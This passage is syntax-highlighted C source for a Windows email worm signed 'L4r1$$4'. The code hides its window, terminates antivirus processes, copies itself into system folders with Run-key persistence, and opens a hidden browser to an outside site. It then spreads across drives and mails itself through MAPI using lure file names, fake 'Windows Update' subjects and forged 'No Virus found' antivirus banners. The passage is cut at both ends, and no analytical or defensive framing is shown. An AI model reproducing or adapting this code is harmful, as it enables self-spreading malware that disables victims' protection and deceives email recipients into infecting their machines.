</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">drives</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"a:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"b:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"c:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"d:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"e:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"f:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"g:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"h:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"i:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"j:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"k:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"l:"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"m:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"n:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"o:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"p:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"q:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"r:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"s:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"t:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"u:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"v:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"w:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"x:"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"y:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"z:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fileNames</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"Message.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Letter.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Information.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOVE_LETTER_FOR_YOU.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Documents.exe"</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc6">"Attached_Message.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Microsoft_Update.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Private_Letter.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Private_Document.exe"</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc6">"Important_Message.exe"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subs</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"Re: Message"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re: Letter"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re: Information"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Warning of your mail "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re: Your Documents"</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc6">"Re: Account Info"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Windows Update"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re: My Letter"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re: Docs"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re: Your Email Info"</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">texts</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc12">"+++ Attachment: No Virus found
</span><span class="sc0">                  </span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">MessageLabs</span><span class="sc0"> </span><span class="sc11">AntiVirus</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">www</span><span class="sc10">.</span><span class="sc11">messagelabs</span><span class="sc10">.</span><span class="sc11">com</span><span class="sc6">" , "</span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">No</span><span class="sc0"> </span><span class="sc11">Virus</span><span class="sc0"> </span><span class="sc11">found</span><span class="sc0">
                                                                      </span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Bitdefender</span><span class="sc0"> </span><span class="sc11">AntiVirus</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">www</span><span class="sc10">.</span><span class="sc11">bitdefender</span><span class="sc10">.</span><span class="sc11">com</span><span class="sc6">" , "</span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">No</span><span class="sc0"> </span><span class="sc11">Virus</span><span class="sc0"> </span><span class="sc11">found</span><span class="sc0">
                                                                                                                          </span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">MC</span><span class="sc10">-</span><span class="sc11">Afee</span><span class="sc0"> </span><span class="sc11">AntiVirus</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">www</span><span class="sc10">.</span><span class="sc11">mcafee</span><span class="sc10">.</span><span class="sc11">com</span><span class="sc6">" , "</span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">No</span><span class="sc0"> </span><span class="sc11">Virus</span><span class="sc0"> </span><span class="sc11">found</span><span class="sc0">
                                                                                                     </span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Kaspersky</span><span class="sc0"> </span><span class="sc11">AntiVirus</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">www</span><span class="sc10">.</span><span class="sc11">kaspersky</span><span class="sc10">.</span><span class="sc11">com</span><span class="sc6">" , "</span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">No</span><span class="sc0"> </span><span class="sc11">Virus</span><span class="sc0"> </span><span class="sc11">found</span><span class="sc0">       
                                                                                                                 </span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Panda</span><span class="sc0"> </span><span class="sc11">AntiVirus</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">www</span><span class="sc10">.</span><span class="sc11">pandasoftware</span><span class="sc10">.</span><span class="sc11">com</span><span class="sc6">" , "</span><span class="sc0"> </span><span class="sc10">+++</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">No</span><span class="sc0"> </span><span class="sc11">Virus</span><span class="sc0"> </span><span class="sc11">found</span><span class="sc0"> 
                                                                                                                                          </span><span class="sc10">++++</span><span class="sc0"> </span><span class="sc11">Norton</span><span class="sc0"> </span><span class="sc11">AntiVirus</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">www</span><span class="sc10">.</span><span class="sc11">symantec</span><span class="sc10">.</span><span class="sc11">de</span><span class="sc12">" }        
</span><span class="sc0">                                                                                                                                                                    
                                                                                                                                                                                                    
                 </span><span class="sc12">",
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">GetModH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">mes</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">counting</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">std</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">payload</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetDebugPriv</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Kill</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">kill_av</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_drives</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">drives</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">no</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hide</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">AllocConsole</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc11">hide</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindWindowA</span><span class="sc10">(</span><span class="sc6">"ConsoleWindowClass"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ShowWindow</span><span class="sc10">(</span><span class="sc11">hide</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">60000</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">GetDebugPriv</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc11">CreateMutex</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"-)(-=|L4r1$$4|=-)(-"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_ALREADY_EXISTS</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">kill_av</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Kill</span><span class="sc10">(</span><span class="sc11">kill_av</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sys</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sys2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">windir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">GetModH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">sys</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sys</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">sys2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sys2</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sys</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\MSLARISSA.pif"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sys2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\CmdPrompt32.pif"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\SP00Lsv32.pif"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sys</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sys2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MSLARISSA"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">sys</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sys</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Command Prompt32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">sys2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sys2</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"(L4r1$$4) (4nt1) (V1ruz)"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">no</span><span class="sc10">();</span><span class="sc0">

  </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IExplore.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"http://roattack.go.ro"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">60000</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"C:\\WINDOWS\\WinVBS.vbs"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">find_drives</span><span class="sc10">(</span><span class="sc11">drives</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">MAPIlHnd</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">buffs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">keyHnd</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keyPath</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keyItem</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Personal"</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">counting</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">counting</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">counting</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc10">)(</span><span class="sc11">counting</span><span class="sc10">/</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc4">512</span><span class="sc10">))</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">MAPIlHnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadLibraryA</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MAPIlHnd</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MSendMail</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">MSendMail</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc6">"\\windows"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">((</span><span class="sc11">HKEY</span><span class="sc10">)</span><span class="sc4">0x80000001</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">keyPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">keyHnd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ERROR_SUCCESS</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">keyHnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">keyItem</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">buffs</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc11">buffs</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc11">buffs</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">findMail</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">MAPIlHnd</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/*     1 juzt w4nn4 $4y... 1 l0v3 u ~!L4r1$$4!~     */</span><span class="sc0">

  </span><span class="sc11">payload</span><span class="sc10">();</span><span class="sc0">

